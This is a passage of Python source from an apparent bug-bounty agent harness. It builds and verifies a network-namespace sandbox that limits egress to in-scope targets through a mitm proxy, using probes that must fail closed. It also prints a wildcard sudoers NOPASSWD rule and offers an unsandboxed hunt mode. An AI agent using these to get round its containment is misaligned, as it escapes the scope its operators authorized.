        f"the scope of {scope.engagement!r}, so asserting that one of them is unreachable "
        f"would prove nothing. Review the rules: bb scope show {scope.engagement}"
    )


def bare_ip_probe_addr(scope: Scope) -> str:
    """An address that answers off this machine and is not in this engagement's scope.

    It has to be an address, not a name: the no-resolver control would stop a
    name on its own, and then the assertion would no longer test the ruleset.
    """
    for candidate in BARE_IP_PROBE_ADDRS:
        if is_ip(candidate) and not scope.decide(candidate).allowed:
            return candidate
    raise SandboxError(
        f"no usable bare-IP probe address is left: every one of "
        f"{', '.join(BARE_IP_PROBE_ADDRS)} is either not an address or inside the scope of "
        f"{scope.engagement!r}, so the bare-address assertion would prove nothing. Review "
        f"the cidr rules: bb scope show {scope.engagement}"
    )


def build_probes(
    spec: SandboxPlan, scope: Scope, *, python: str | None = None
) -> tuple[Probe, ...]:
    """The three assertions `verify` makes, as commands to run in the namespace.

    Two of them are negative and one is positive, and the positive one is the
    point: a ruleset that drops everything also passes both negatives, so only
    the in-scope request through the proxy distinguishes a working sandbox from
    a namespace with no network at all.
    """
    interpreter = python or sys.executable or "python3"
    out_host = out_of_scope_probe_host(scope)
    bare_ip = bare_ip_probe_addr(scope)
    in_host = in_scope_probe_host(scope)
    timeout = str(PROBE_CONNECT_TIMEOUT_S)
    proxy_start = (
        f"bb proxy start {spec.engagement} --listen-host {spec.host_addr} "
        f"--port {spec.proxy_port}"
    )
    rebuild = f"bb sandbox down {spec.engagement} && bb sandbox up {spec.engagement}"
    return (
        Probe(
            name="out_of_scope_host_direct",
            engagement=spec.engagement,
            expected=(
                f"a direct connection to the out-of-scope host {out_host}:{PROBE_PORT} "
                "fails from inside the namespace"
            ),
            want_connected=False,
            argv=(
                interpreter, "-I", "-c", _CONNECT_PROBE,
                out_host, str(PROBE_PORT), timeout,
            ),
            remedy=(
                "egress is not contained: the namespace reached a host nobody authorized. "
                f"Rebuild it and re-check: {rebuild} && bb sandbox verify {spec.engagement}"
            ),
        ),
        Probe(
            name="bare_ip_direct",
            engagement=spec.engagement,
            expected=(
                f"a direct connection to the bare address {bare_ip}:{PROBE_PORT} fails from "
                "inside the namespace"
            ),
            want_connected=False,
            argv=(
                interpreter, "-I", "-c", _CONNECT_PROBE,
                bare_ip, str(PROBE_PORT), timeout,
            ),
            remedy=(
                "egress is not contained: an address needs no resolver, so the nftables "
                f"drop policy is the only thing that can stop this one. Rebuild it: "
                f"{rebuild}"
            ),
        ),
        Probe(
            name="in_scope_host_via_proxy",
            engagement=spec.engagement,
            expected=(
                f"CONNECT {in_host}:{PROBE_PORT} through the harness proxy at "
                f"{spec.host_addr}:{spec.proxy_port} returns 200"
            ),
            want_connected=True,
            via_proxy=True,
            argv=(
                interpreter, "-I", "-c", _PROXY_CONNECT_PROBE,
                spec.host_addr, str(spec.proxy_port), in_host, str(PROBE_PORT), timeout,
            ),
            remedy=(
                "the namespace cannot reach an authorized target, so a phase inside it "
                f"would see a dead target. Start the proxy on the host end of the veth: "
                f"{proxy_start}"
            ),
        ),
    )


# ---- verification results ----


@dataclass(frozen=True)
class SandboxCheck:
    """One named assertion and what actually happened."""

    name: str
    ok: bool
    expected: str
    observed: str
    remedy: str = ""

    @property
    def problem(self) -> str:
        text = (
            f"sandbox check {self.name!r} failed: expected {self.expected}; "
            f"observed {self.observed}"
        )
        return f"{text}. {self.remedy}" if self.remedy else text

    def as_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "ok": self.ok,
            "expected": self.expected,
            "observed": self.observed,
            "remedy": self.remedy,
        }


@dataclass(frozen=True)
class SandboxVerification:
    """The result of `verify`: every assertion by name, with its outcome.

    Containment means all three assertions passed, so an assertion that was
    never attempted counts against it: "not attempted" and "passed" must not
    read the same. Iterating yields the failures as remediable strings, which
    is what the runner and the CLI need; the checks stay available to anything
    that wants to show the whole test.
    """

    engagement: str
    namespace: str
    checks: tuple[SandboxCheck, ...]

    @property
    def attempted(self) -> frozenset[str]:
        return frozenset(check.name for check in self.checks)

    @property
    def not_attempted(self) -> tuple[str, ...]:
        return tuple(name for name in ASSERTIONS if name not in self.attempted)

    @property
    def ok(self) -> bool:
        passed = {check.name for check in self.checks if check.ok}
        return all(check.ok for check in self.checks) and set(ASSERTIONS) <= passed

    @property
    def problems(self) -> tuple[str, ...]:
        found = [check.problem for check in self.checks if not check.ok]
        missing = self.not_attempted
        if missing:
            # Without this line a result could be "not contained" with nothing
            # to print, and a caller that reads emptiness as success would run
            # the hunt uncontained.
            found.append(
                f"sandbox assertions not attempted: {', '.join(missing)} — egress is not "
                f"proven contained until all {len(ASSERTIONS)} pass. "
                f"Run: bb sandbox verify {self.engagement or '<engagement>'}"
            )
        return tuple(found)

    def __iter__(self) -> Iterator[str]:
        return iter(self.problems)

    def __bool__(self) -> bool:
        return self.ok

    def as_dict(self) -> dict[str, Any]:
        outcome = {check.name: ("pass" if check.ok else "fail") for check in self.checks}
        return {
            "engagement": self.engagement,
            "namespace": self.namespace,
            "contained": self.ok,
            "assertions": {
                name: outcome.get(name, "not_attempted") for name in ASSERTIONS
            },
            "checks": [check.as_dict() for check in self.checks],
            "problems": list(self.problems),
        }


def _tail(text: str, limit: int = 300) -> str:
    collapsed = " ".join((text or "").split())
    return collapsed[-limit:] if collapsed else ""


def parse_probe_output(stdout: str) -> dict[str, Any] | None:
    """The probe's JSON result, or None if it did not produce one.

    The last JSON object on stdout wins, so a warning printed by an interpreter
    or a wrapper does not hide the answer.
    """
    for line in reversed((stdout or "").splitlines()):
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(data, dict):
            return data
    return None


def _refused_by_timeout(error: str) -> bool:
    """Did the probe's connect wait out its own timeout rather than being refused?

    The exception type is the signal, not the clock: `socket.create_connection`
    raises `TimeoutError` only when nothing answered at all, which is what a
    `drop` produces. A reject gives `ConnectionRefusedError`, an absent route
    gives `OSError`, and a reset gives `ConnectionResetError` -- all immediate.
    Reading the type rather than timing the subprocess keeps this independent of
    how long `sudo`, `ip netns exec` and the interpreter took to start.
    """
    first = (error or "").split(":", 1)[0].strip()
    return first in {"TimeoutError", "timeout", "socket.timeout"}


def evaluate_probe(
    probe: Probe, returncode: int, stdout: str, stderr: str
) -> SandboxCheck:
    """Turn one probe's output into a check. A probe that says nothing fails.

    Fail closed: a control that cannot verify must deny. An unparseable probe
    result is treated as a failed assertion, not a passed one, because the
    common cause is the namespace not being enterable at all.
    """
    data = parse_probe_output(stdout)
    if data is None:
        noise = _tail(stderr) or _tail(stdout) or "no output"
        return SandboxCheck(
            name=probe.name,
            ok=False,
            expected=probe.expected,
            observed=f"the probe returned no result (exit {returncode}): {noise}",
            remedy=(
                "the assertion could not be made, so the sandbox counts as not containing. "
                "Entering the namespace needs CAP_SYS_ADMIN, so the usual cause is an "
                f"expired sudo timestamp: run `bb sandbox up {probe.engagement}` again, or "
                "add the sudoers line it prints for unattended runs"
            ),
        )

    connected = bool(data.get("connected"))
    error = str(data.get("error") or "")

    if not probe.want_connected:
        if connected:
            return SandboxCheck(
                probe.name, False, probe.expected,
                "the connection succeeded, so traffic left the namespace unchecked",
                probe.remedy,
            )
        if _refused_by_timeout(error):
            # Contained, but by a silent drop rather than this harness's reject
            # rules -- so the namespace in place is not the one `up` builds, and
            # the usual cause is a stale one left from an older version. It is
            # reported as a failure, not a warning, because the difference is
            # not cosmetic: a drop makes every blocked attempt hang for the
            # kernel's full SYN retry schedule, the agent reads the timeout as
            # an unresponsive target, and the angle ledger then records ground
            # as covered that was never tested. Rebuilding is one command.
            return SandboxCheck(
                probe.name, False, probe.expected,
                f"the connection was contained, but by a silent drop ({error}) rather "
                f"than a reject, so a blocked attempt hangs instead of failing",
                f"the namespace is not the one this version builds. Rebuild it: "
                f"bb sandbox down {probe.engagement} && bb sandbox up {probe.engagement} "
                f"&& bb sandbox verify {probe.engagement}",
            )
        return SandboxCheck(
            probe.name, True, probe.expected,
            f"the connection failed immediately, as required ({error or 'no error reported'})",
        )

    status = data.get("status")
    head = str(data.get("head") or "")
    if not connected:
        return SandboxCheck(
            probe.name, False, probe.expected,
            f"the proxy could not be reached at all ({error or 'no error reported'})",
            probe.remedy,
        )
    if status != 200:
        detail = head or error or "no response line"
        return SandboxCheck(
            probe.name, False, probe.expected,
            f"the proxy answered {status!r} instead of 200 ({detail})",
            probe.remedy,
        )
    return SandboxCheck(
        probe.name, True, probe.expected,
        f"the proxy established the tunnel ({head or 'HTTP/1.1 200'})",
    )


def _run_probe(spec: SandboxPlan, probe: Probe) -> SandboxCheck:
    try:
        argv = wrap_argv(spec.engagement, probe.argv)
    except SandboxError as exc:
        return SandboxCheck(probe.name, False, probe.expected, str(exc))
    try:
        done = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            timeout=PROBE_WALL_S,
            stdin=subprocess.DEVNULL,
        )
    except subprocess.TimeoutExpired:
        return SandboxCheck(
            probe.name, False, probe.expected,
            f"the probe did not finish within {PROBE_WALL_S:.0f}s, so nothing was proved",
            probe.remedy,
        )
    except OSError as exc:
        return SandboxCheck(
            probe.name, False, probe.expected,
            f"the probe could not be started ({exc.strerror or exc}): {argv[0]}",
            probe.remedy,
        )
    return evaluate_probe(probe, done.returncode, done.stdout, done.stderr)


# ---- the public verbs ----


def _failed(name: str, expected: str, observed: str, remedy: str = "") -> SandboxCheck:
    return SandboxCheck(name, False, expected, observed, remedy)


def verify(engagement: str) -> SandboxVerification:
    """Assert, positively, that this engagement's egress is contained.

    Three assertions, each named in the result: an out-of-scope host cannot be
    reached directly, a bare address cannot be reached directly, and an
    in-scope host can be reached through the proxy. The last one is why this is
    a test and not an observation -- a namespace with no network at all passes
    the first two.

    Never raises. The runner and the CLI read this to decide whether a hunt may
    start, so an unexpected failure is reported as a failed assertion: that
    denies the hunt, which is the safe direction. It is not a degraded
    continue -- nothing proceeds on the strength of a verification that did not
    finish.
    """
    try:
        return _verify(engagement)
    except Exception as exc:
        name = (engagement or "").strip()
        return SandboxVerification(
            name,
            NS_PREFIX + name,
            (
                _failed(
                    "verify",
                    "a verification that runs to a verdict",
                    f"the check itself failed with {type(exc).__name__}: {exc}",
                    f"Run: bb sandbox down {name or '<engagement>'} && "
                    f"bb sandbox up {name or '<engagement>'}",
                ),
            ),
        )


def _verify(engagement: str) -> SandboxVerification:
    name = (engagement or "").strip()
    namespace = NS_PREFIX + name
    try:
        name = require_name(name)
    except SandboxError as exc:
        return SandboxVerification(
            name, namespace, (_failed("engagement_name", "a usable engagement name", str(exc)),)
        )

    kernel = kernel_problem()
    if kernel:
        return SandboxVerification(
            name, namespace,
            (_failed("kernel", "a kernel with network namespace support", kernel),),
        )
    try:
        require_tools()
    except SandboxError as exc:
        return SandboxVerification(
            name, namespace, (_failed("tools", "ip, nft and setpriv on PATH", str(exc)),)
        )

    try:
        spec = load_plan(name)
    except SandboxError as exc:
        return SandboxVerification(
            name, namespace, (_failed("plan", f"a sandbox built for {name!r}", str(exc)),)
        )

    if netns_file(spec.namespace) is None:
        return SandboxVerification(
            name, spec.namespace,
            (
                _failed(
                    "namespace",
                    f"the network namespace {spec.namespace} exists",
                    f"no namespace {spec.namespace} is mounted under /run/netns, so nothing "
                    "confines egress",
                    f"Run: bb sandbox up {name}",
                ),
            ),
        )

    ca = Path(spec.ca_file)
    if not ca.is_file():
        return SandboxVerification(
            name, spec.namespace,
            (
                _failed(
                    "ca_file",
                    f"the mitm CA at {spec.ca_file} is readable",
                    "the CA the namespace was built around is gone, so every HTTPS request "
                    "inside it would fail certificate verification",
                    f"Run: bb proxy start {name}, then bb sandbox down {name} && "
                    f"bb sandbox up {name}",
                ),
            ),
        )

    try:
        scope = Scope.from_lock_file(paths.lock_path(name))
    except (ScopeError, OSError, json.JSONDecodeError, ValueError) as exc:
        return SandboxVerification(
            name, spec.namespace,
            (
                _failed(
                    "scope",
                    "a signed, armed scope to test the proxy path against",
                    str(exc),
                    f"Run: bb scope compile {name} && bb arm {name} --as <you>",
                ),
            ),
        )
    auth_problem = scope.authorization_error()
    if auth_problem:
        return SandboxVerification(
            name, spec.namespace,
            (
                _failed(
                    "armed",
                    "an armed engagement, so the in-scope assertion is authorized",
                    auth_problem,
                    f"Run: bb arm {name} --as <you>",
                ),
            ),
        )

    try:
        probes = build_probes(spec, scope)
    except SandboxError as exc:
        return SandboxVerification(
            name, spec.namespace,
            (_failed("probes", "three probes derivable from the scope", str(exc)),),
        )

    return SandboxVerification(
        name, spec.namespace, tuple(_run_probe(spec, probe) for probe in probes)
    )


def status(engagement: str) -> dict[str, Any]:
    """What exists for this engagement's sandbox, without probing or privilege.

    Cheap and side-effect free, so it is safe to call for a status line. It
    reports what is configured; `verify` is what decides whether egress is
    actually contained.
    """
    name = (engagement or "").strip()
    report: dict[str, Any] = {
        "engagement": name,
        "namespace": NS_PREFIX + name,
        "up": False,
        "built": False,
        "namespace_present": False,
        "host_interface_present": False,
        "ca_present": False,
        "state_file": None,
        "up_script": None,
        "env_file": None,
        "proxy": None,
        "launch": None,
        "problem": None,
    }
    try:
        name = require_name(name)
    except SandboxError as exc:
        report["problem"] = str(exc)
        return report

    report["namespace"] = NS_PREFIX + name
    report["state_file"] = str(state_path(name))
    report["up_script"] = str(script_path(name, "up"))
    report["env_file"] = str(env_path(name))
    try:
        spec = load_plan(name)
    except SandboxError as exc:
        report["problem"] = str(exc)
        return report

    report["built"] = True
    report["namespace"] = spec.namespace
    report["proxy"] = spec.proxy_endpoint
    report["ca_file"] = spec.ca_file
    report["ca_present"] = Path(spec.ca_file).is_file()
    report["namespace_present"] = netns_file(spec.namespace) is not None
    report["host_interface_present"] = (Path("/sys/class/net") / spec.host_if).exists()
    report["host_addr"] = spec.host_addr
    report["ns_addr"] = spec.ns_addr
    report["up"] = bool(
        report["namespace_present"] and report["host_interface_present"] and report["ca_present"]
    )
    report["launch"] = shlex.join(netns_prefix(spec))
    return report


def _write_env_file(spec: SandboxPlan) -> Path:
    """A sourceable copy of the namespace environment, for working by hand."""
    path = env_path(spec.engagement)
    lines = [
        f"# bbh sandbox environment for engagement {spec.engagement!r}.",
        "# Written by bb sandbox up. The runner passes these to each phase itself;",
        "# source this only to work inside the namespace by hand:",
        "#",
        f"#   . {path}",
        f"#   sudo {shlex.join(netns_prefix(spec))} bash",
        "",
    ]
    lines += [f"export {key}={shlex.quote(value)}" for key, value in environ(spec).items()]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


def _say(line: str) -> None:
    """Operator narrative goes to stderr, so `bb sandbox up --json` keeps stdout."""
    print(line, file=sys.stderr)


def _run_privileged(script: Path, *, what: str, engagement: str) -> None:
    """Run one generated script under a single sudo. The only privileged step."""
    if os.geteuid() == 0:
        argv = ["/bin/sh", str(script)]
    else:
        sudo = shutil.which("sudo")
        if not sudo:
            raise SandboxError(
                f"sudo is not installed, so the sandbox cannot be {what}. Read the script "
                f"and run it as root yourself: {script}"
            )
        # Interactive on purpose, unlike the launch prefix: an operator is
        # present at `bb sandbox up`, and a password prompt here is better than
        # a sandbox that silently was not built.
        argv = [sudo, "--", "/bin/sh", str(script)]
    try:
        # stderr and stdin stay attached to the terminal: sudo writes its
        # password prompt to stderr and reads the answer from the tty, so
        # capturing either turns a prompt into a silent hang. Only the script's
        # own progress is captured, and it is echoed to stderr after.
        done = subprocess.run(argv, text=True, stdout=subprocess.PIPE)
    except OSError as exc:
        raise SandboxError(
            f"could not run the sandbox script ({exc.strerror or exc}): {script}\n"
            f"Read it and run it yourself: sudo /bin/sh {script}"
        ) from exc
    if done.stdout:
        _say(done.stdout.rstrip())
    if done.returncode != 0:
        raise SandboxError(
            f"the sandbox script failed (exit {done.returncode}) and the namespace was not "
            f"{what}; its error output is above.\n"
            f"The whole privileged change is in one file; read it and run it by hand to see "
            f"where it stops: sudo /bin/sh {script}\n"
            f"Then: bb sandbox verify {engagement}"
        )


def up(
    engagement: str,
    *,
    proxy_port: int = DEFAULT_PROXY_PORT,
    dry_run: bool = False,
    out: Callable[[str], None] = _say,
) -> dict[str, Any]:
    """Build the engagement's namespace. One sudo, one script, printed first."""
    name = require_name(engagement)
    kernel = kernel_problem()
    if kernel:
        raise SandboxError(kernel)
    tools = require_tools()

    spec = plan(
        name,
        proxy_port=proxy_port,
        ca_file=find_ca(name),
        tools=tools,
        taken=host_addresses(),
    )
    text = build_up_script(spec)
    script = script_path(name, "up")
    script.write_text(text, encoding="utf-8")
    script.chmod(0o700)

    # Printed before it runs, in full: one sudo over one readable change.
    out(f"The entire privileged change for this sandbox, from {script}:")
    out("")
    out(text)
    out("")

    if dry_run:
        out(f"[dry run] nothing was run. To apply it: sudo /bin/sh {script}")
        return {"engagement": name, "applied": False, "plan": spec.as_dict(),
                "script": str(script)}

    _run_privileged(script, what="brought up", engagement=name)
    # Written after the script succeeds: wrap_argv trusts this file, so it must
    # not describe a namespace that was never built.
    state = save_plan(spec)
    env_file = _write_env_file(spec)
    down_script = script_path(name, "down")
    down_script.write_text(build_down_script(spec), encoding="utf-8")
    down_script.chmod(0o700)

    out(f"sandbox up: {spec.namespace}, egress limited to {spec.proxy_endpoint}")
    out(f"  plan        {state}")
    out(f"  environment {env_file}")
    out(f"  teardown    bb sandbox down {name}")
    out("")
    out("Next, on the host end of the veth, so the namespace can reach it:")
    out(f"  bb proxy start {name} --listen-host {spec.host_addr} --port {spec.proxy_port}")
    out(f"  bb sandbox verify {name}")
    out("")
    out(
        "Entering the namespace is privileged, so every phase launch needs sudo. A hunt "
        "started hours later has no sudo timestamp left; for unattended runs add:"
    )
    out("  sudo visudo -f /etc/sudoers.d/bbh-sandbox")
    out(f"  {_sudoers_line(spec)}")
    out("  That grants nothing new: setpriv drops to this uid before the command runs.")
    return {
        "engagement": name,
        "applied": True,
        "plan": spec.as_dict(),
        "script": str(script),
        "state_file": str(state),
        "env_file": str(env_file),
        "proxy": spec.proxy_endpoint,
    }


def _sudoers_line(spec: SandboxPlan) -> str:
    """The NOPASSWD rule that lets an unattended hunt enter the namespace."""
    user = os.environ.get("USER") or os.environ.get("LOGNAME") or f"#{os.getuid()}"
    return (
        f"{user} ALL=(root) NOPASSWD: {' '.join(netns_prefix(spec))} *"
    )


def down(
    engagement: str,
    *,
    dry_run: bool = False,
    out: Callable[[str], None] = _say,
) -> dict[str, Any]:
    """Tear the namespace down and forget the plan, so wrap_argv fails closed."""
    name = require_name(engagement)
    try:
        spec = load_plan(name)
    except SandboxError:
        # Nothing recorded: rebuild the plan from the name so a sandbox left by
        # a crashed `up` can still be cleaned up. Safe, because the teardown
        # touches only names derived from the engagement, never addresses.
        spec = plan(name, ca_file="", tools=require_tools())

    text = build_down_script(spec)
    script = script_path(name, "down")
    script.write_text(text, encoding="utf-8")
    script.chmod(0o700)
    out(f"The entire privileged change for this teardown, from {script}:")
    out("")
    out(text)
    out("")
    if dry_run:
        out(f"[dry run] nothing was run. To apply it: sudo /bin/sh {script}")
        return {"engagement": name, "applied": False, "script": str(script)}

    _run_privileged(script, what="taken down", engagement=name)
    state_path(name).unlink(missing_ok=True)
    env_path(name).unlink(missing_ok=True)
    out(f"sandbox down: {spec.namespace} removed; phases now have no containment")
    out(f"  bb sandbox up {name}            # build it again")
    out(f"  bb hunt {name} --unsandboxed    # hunt with the static guard as the only barrier")
    return {"engagement": name, "applied": True, "script": str(script)}
